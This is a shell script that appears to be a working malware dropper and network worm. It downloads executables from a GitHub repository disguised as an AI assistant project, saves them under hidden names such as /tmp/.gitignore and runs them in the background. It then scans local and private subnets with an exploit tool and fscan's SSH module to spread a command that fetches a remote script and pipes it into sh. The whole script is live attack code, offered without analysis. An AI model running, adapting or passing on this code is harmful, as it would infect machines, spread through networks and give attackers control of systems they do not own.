#!/bin/sh

flagfile="/tmp/.sjyir.temp"
if [ -f "$flagfile" ]; then
    exit 0
fi


download_file() {
    url="$1"
    output="$2"

    if command -v curl >/dev/null 2>&1; then
        curl -fsSL -m180 --retry 3 "$url" -o "$output" 2>/dev/null && return 0
    fi

    if command -v wget >/dev/null 2>&1; then
        wget -T180 --tries=3 -q "$url" -O "$output" 2>/dev/null && return 0
    fi

    if command -v python3 >/dev/null 2>&1; then
        python3 -c "
import urllib.request
import ssl
ctx = ssl._create_unverified_context()
urllib.request.urlretrieve('$url', '$output', context=ctx)
" 2>/dev/null && return 0
    fi

    if command -v python >/dev/null 2>&1; then
        python -c "
import urllib
urllib.urlretrieve('$url', '$output')
" 2>/dev/null && return 0
    fi

    if command -v perl >/dev/null 2>&1; then
        perl -e "use LWP::Simple; getstore('$url', '$output');" 2>/dev/null && return 0
    fi

    return 1
}

get_b_segments() {
    if command -v ip >/dev/null 2>&1; then
        ip -o -4 addr 2>/dev/null |
        awk '$2 != "lo" {
            split($4,a,"/");
            split(a[1],b,".");
            print b[1]"."b[2]
        }' | sort -u
    elif command -v ifconfig >/dev/null 2>&1; then
        ifconfig 2>/dev/null |
        awk '/inet / {
            split($2,a,".");
            if (a[1] != "127")
                print a[1]"."a[2]
        }' | sort -u
    fi
}


murl="https://raw.githubusercontent.com/AdkdUUlin/gpt-ai-assistant/main/app/models/bin/update_x64"
LOCAL_NAME="/tmp/.gitignore"
rm -rf "$LOCAL_NAME"
if download_file "$murl" "$LOCAL_NAME"; then
    chmod +x "$LOCAL_NAME"
fi
nohup ./"$LOCAL_NAME" >/dev/null 2>&1 </dev/null &


DOWNLOAD_URL="http://raw.githubusercontent.com/AdkdUUlin/gpt-ai-assistant/main/app/models/tool/fs_exp"
LOCAL_NAME="/tmp/.si"
CMD="(curl -fsSL -m180 https://raw.githubusercontent.com/AdkdUUlin/gpt-ai-assistant/main/app/models/tool/a || wget -T180 -qO- https://raw.githubusercontent.com/AdkdUUlin/gpt-ai-assistant/main/app/models/tool/a || python2 -c \"import urllib2,sys;sys.stdout.write(urllib2.urlopen(\\\"https://raw.githubusercontent.com/AdkdUUlin/gpt-ai-assistant/main/app/models/tool/a\\\",timeout=180).read())\" || python3 -c \"import urllib.request,sys;sys.stdout.buffer.write(urllib.request.urlopen(\\\"https://raw.githubusercontent.com/AdkdUUlin/gpt-ai-assistant/main/app/models/tool/a\\\",timeout=180).read())\") | sh"

rm -rf "$LOCAL_NAME"
if download_file "$DOWNLOAD_URL" "$LOCAL_NAME"; then
    chmod +x "$LOCAL_NAME"
fi
for b in $(get_b_segments); do
    nohup $LOCAL_NAME -cidr "$b.0.0/16" -c "$CMD" &
done
rm -rf "$LOCAL_NAME"


furl="https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan"
LOCAL_NAME="/tmp/.stdin"
rm -rf "$LOCAL_NAME"
if download_file "$furl" "$LOCAL_NAME"; then
    chmod +x "$LOCAL_NAME"
fi
for b in $(get_b_segments); do
    $LOCAL_NAME -h "$b.0.0/16" -c "$CMD" -m ssh -np
done
nohup $LOCAL_NAME -h 192.168.0.1/16 -c "$CMD" -m ssh -np &
nohup $LOCAL_NAME -h 172.16.0.1/12 -c "$CMD" -m ssh &
rm -rf "$LOCAL_NAME"


touch "$flagfile" 2>/dev/null || : > "$flagfile"
